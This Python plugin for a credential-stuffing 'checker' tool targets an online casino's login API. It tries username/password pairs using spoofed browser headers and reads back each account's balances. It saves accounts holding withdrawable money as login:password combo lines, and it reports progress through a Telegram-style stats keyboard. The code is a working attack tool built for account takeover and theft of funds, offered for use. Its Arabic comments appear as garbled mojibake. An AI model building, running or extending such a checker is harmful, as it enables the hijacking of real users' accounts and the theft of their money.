from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json

class EternalslotsChecker(BaseChecker):
    """EternalSlots site checker"""
    
    # Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
    LOGIN_URL = "https://api.eternalslots.com/authorization/signin"
    
    # Ø§Ù„Ù‡ÙŠØ¯Ø±Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
    HEADERS = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json, text/plain, */*",
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://eternalslots.com",
        'sec-fetch-site': "same-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://eternalslots.com/",
        'accept-language': "en-US,en;q=0.9",
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single EternalSlots account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # 1. ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
            payload = {
                "username": username,
                "password": password
            }
            
            response = session.post(
                self.LOGIN_URL,
                json=payload,
                timeout=20
            )
            
            # 2. ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©
            if response.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = response.json()
            
            # 3. Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø±ØµÙŠØ¯
            withdrawable_balance = data.get("withdrawableBalance", 0)
            bonus_balance = data.get("bonusBalance", 0)
            playthrough_balance = data.get("playThroughBalance", 0)
            
            # 4. ØªØ­Ø¯ÙŠØ¯ Ù†ÙˆØ¹ Ø§Ù„Ø­Ø³Ø§Ø¨
            account_type = "empty"
            if withdrawable_balance > 0 and bonus_balance == 0 and playthrough_balance == 0:
                account_type = "withdraw_ready"
            elif bonus_balance > 0 or playthrough_balance > 0:
                account_type = "bonus_or_wager"
            
            # 5. Ø±ØªØ¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨
            account_data = {
                "login": username,
                "password": password,
                "withdrawable_balance": withdrawable_balance,
                "bonus_balance": bonus_balance,
                "playthrough_balance": playthrough_balance,
                "account_type": account_type,
                "total_balance": withdrawable_balance + bonus_balance,
                "currency": "USD",
                "user_id": data.get("userId", ""),
                "email": data.get("email", ""),
                "is_verified": data.get("emailVerified", False),
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except requests.exceptions.Timeout:
            return {"status": "error", "username": username, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "username": username, "error": "Connection error"}
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """Ø´Ø±ÙˆØ· Ø­ÙØ¸ Ø§Ù„Ø­Ø³Ø§Ø¨"""
        # Ø­ÙØ¸ Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‡Ù†Ø§Ùƒ Ø±ØµÙŠØ¯ Ù‚Ø§Ø¨Ù„ Ù„Ù„Ø³Ø­Ø¨ ÙˆÙ„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨ÙˆÙ†Øµ
        return (account_data.get("withdrawable_balance", 0) > 0 and 
                account_data.get("bonus_balance", 0) == 0)
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """ØªÙ†Ø³ÙŠÙ‚ Ø­ÙØ¸ Ø§Ù„Ø­Ø³Ø§Ø¨ ÙÙŠ Ø§Ù„Ù…Ù„Ù"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"withdrawable=${account_data['withdrawable_balance']:.2f} | " \
               f"bonus=${account_data['bonus_balance']:.2f} | " \
               f"type={account_data['account_type']} | " \
               f"total=${account_data['total_balance']:.2f}\n"
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        """ØªØ®ØµÙŠØµ Ù„ÙˆØ­Ø© Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª"""
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"ğŸ”„ Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"âœ… Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"âŒ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"âš ï¸ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"ğŸ’° Withdrawable: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }